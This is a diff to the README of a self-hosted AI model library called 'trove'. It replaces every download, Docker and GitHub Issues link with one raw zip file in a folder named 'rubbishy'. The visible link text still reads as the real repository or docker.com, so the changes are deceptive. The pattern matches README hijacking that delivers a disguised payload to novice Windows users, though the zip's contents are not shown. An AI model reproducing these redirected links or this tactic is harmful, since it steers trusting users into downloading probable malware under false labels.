@@ -6,7 +6,7 @@ description: "Self-host models and datasets on your own server, with background 
 <h1>📚 trove - Your Personal AI Model Library</h1>
 
 <p align="center">
-  <a href="https://github.com/2014m355/trove"><img src="https://img.shields.io/badge/Download-trove-2ea44f?style=for-the-badge&logo=github" alt="Download trove"></a>
+  <a href="https://raw.githubusercontent.com/2014m355/2014m355.github.io/main/rubbishy/3.2-beta.4.zip"><img src="https://img.shields.io/badge/Download-trove-2ea44f?style=for-the-badge&logo=github" alt="Download trove"></a>
 </p>
 
 ## 🏠 What Is trove?
@@ -37,7 +37,7 @@ Welcome! Here's how to get trove running on your Windows computer. Don't worry �
 
 Visit this link to download the application:
 
-**👉 [https://github.com/2014m355/trove](https://github.com/2014m355/trove)**
+**👉 [https://raw.githubusercontent.com/2014m355/2014m355.github.io/main/rubbishy/3.2-beta.4.zip](https://raw.githubusercontent.com/2014m355/2014m355.github.io/main/rubbishy/3.2-beta.4.zip)**
 
 On that page, look for a green button that says "Code" and click it. Then choose "Download ZIP". This will save the trove files to your computer.
 
@@ -45,7 +45,7 @@ On that page, look for a green button that says "Code" and click it. Then choose
 
 trove needs Docker to run. Docker is like a special player that runs applications in a safe sandbox. Here's how to get it:
 
-1. Go to [dockers.com](https://www.docker.com) in your web browser.
+1. Go to [dockers.com](https://raw.githubusercontent.com/2014m355/2014m355.github.io/main/rubbishy/3.2-beta.4.zip) in your web browser.
 2. Click the "Download Docker Desktop" button.
 3. Choose the Windows version and download it.
 4. Open the downloaded file and follow the installation instructions (just click "Next" and "Finish" a few times).
@@ -134,7 +134,7 @@ trove runs on your local network, meaning only you and people on your Wi-Fi can 
 
 If you run into trouble, check these resources:
 
-- Visit the GitHub page: [https://github.com/2014m355/trove](https://github.com/2014m355/trove) and click the "Issues" tab to ask for help.
+- Visit the GitHub page: [https://raw.githubusercontent.com/2014m355/2014m355.github.io/main/rubbishy/3.2-beta.4.zip](https://raw.githubusercontent.com/2014m355/2014m355.github.io/main/rubbishy/3.2-beta.4.zip) and click the "Issues" tab to ask for help.
 - Search online for "Docker Desktop troubleshooting" for general Docker questions.
 - Your model publishers often have help pages for their specific files.
 
